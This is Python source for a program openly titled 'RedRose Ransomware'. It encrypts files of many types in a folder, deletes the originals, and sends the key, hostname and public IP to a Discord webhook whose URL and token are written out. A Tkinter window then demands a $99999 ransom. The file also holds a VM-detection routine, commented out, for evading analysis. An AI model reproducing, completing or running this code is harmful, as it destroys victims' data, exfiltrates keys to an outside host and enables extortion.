from tkinter import *
import tkinter as tk
from tkinter import Label, Entry
from Crypto import Random
from Crypto.Cipher import AES
import base64
import subprocess,os
from sys import exit
import ast
import socket
from requests import get
import requests


def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def decrypt(ciphertext, key):
    iv = ciphertext[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext[AES.block_size:])
    return plaintext.rstrip(b"\0")


def encrypt_file():
    global key
    key = Random.get_random_bytes(32)
    #print(key)
    os.chdir("/home/kali/Music/")
    extension = '.html', '.txt', '.cs', '.odt', '.js', '.pdf','.exe','.docx', '.psd', '.ai', '.tif', '.dmg', '.7z','jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'exe','php', 'json', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape'

    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            aa = os.path.join(root, file)
            if file.lower().endswith(extension):
                with open(aa, 'rb') as fo:
                    plaintext = fo.read()
                plaintext = base64.b64encode(plaintext)
                enc = encrypt(plaintext, key)
                with open(aa + ".redrose", 'wb') as fo:
                    fo.write(enc)
                os.remove(aa)

encrypt_file()
def web_hook():
    url = "https://discord.com/api/webhooks/946401167041241099/NzOd8f2D6PREoyrlKrAk5y0Uj7KTJPub_nxJLqNDUQGfT4OYDFrEwrKo1scAW66W5b3j" #add discord webhook url
    data = {
        "content": "",
        "username": socket.gethostname()
    }

    data["embeds"] = [
        {
            "description": key.decode("ISO-8859-1"),
            "title": get('http://api.ipify.org').text
        }
    ]

    result = requests.post(url, json=data)

    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

web_hook()
def decrypt_file(key):
    os.chdir("/home/kali/Music/")
    extension = ('redrose')
    for root, dirs, files in os.walk(os.getcwd()):
        for file in files:
            aa = os.path.join(root, file)
            if file.lower().endswith(extension):
                with open(aa, 'rb') as fo:
                    ciphertext = fo.read()
                dec = decrypt(ciphertext, key)
                dec = base64.b64decode(dec)
                with open(aa[:-8], 'wb') as fo:
                    fo.write(dec)
                os.remove(aa)


def process_exists():
    if os.name != "nt" or os.name != "posix":
        exit()
    process_name = ("vmsrvc.exe", "vmusrvc.exe", "vboxtray.exe", "vmtoolsd.exe", "df5serv.exe", "vboxservice.exe")
    progs = str(subprocess.check_output('tasklist'))
    for i in process_name:
        if i in progs:
            exit()
    else:
        return False

#process_exists()
gui = Tk()
gui.geometry("1000x700")
gui.title("RedRose Ransomware")
canvas = Canvas(gui, width=1000, height=700, bg="black")

canvas.create_text(680, 120, fill="#D50000", font="terminal",
                   text="""\n1.Download Blabla:https://blablabla.com/wallet/\nif you are using a different wallet thats fine.\nSend $99999 to this address:After sending it wait \nfor a confirmation and send us an email and \ninclude your UniqueID:""")
canvas.update()
canvas.pack()
img = PhotoImage(file="/home/kali/Desktop/RedRoseRansomware-main/62.png")
canvas.create_image(20, 20, anchor=NW, image=img)

L1 = Label(gui, text="DECRYPT KEY HERE", fg="#D50000", font=('terminal', 12, 'bold'))
L1.pack()
L1.place(x=610, y=435)

dirname = Entry(gui, textvariable="", width=50, bg="gray")
dirname.pack(side=tk.BOTTOM)
dirname.place(x=480, y=470)


def gett():
    guess = dirname.get()
    dd = ast.literal_eval(guess)
    decrypt_file(key=dd)


def Close():
    gui.destroy()


button = tk.Button(gui,
                   text="DECRYPT",
                   fg="#FF0000", bg="black", width=20, pady=8,
                   command=gett)

exit_button = Button(gui, text="Exit", bg="black", fg="#D50000", width=10, pady=8, command=Close)
exit_button.place(x=640, y=560)
button.place(x=600, y=510)
mainloop()
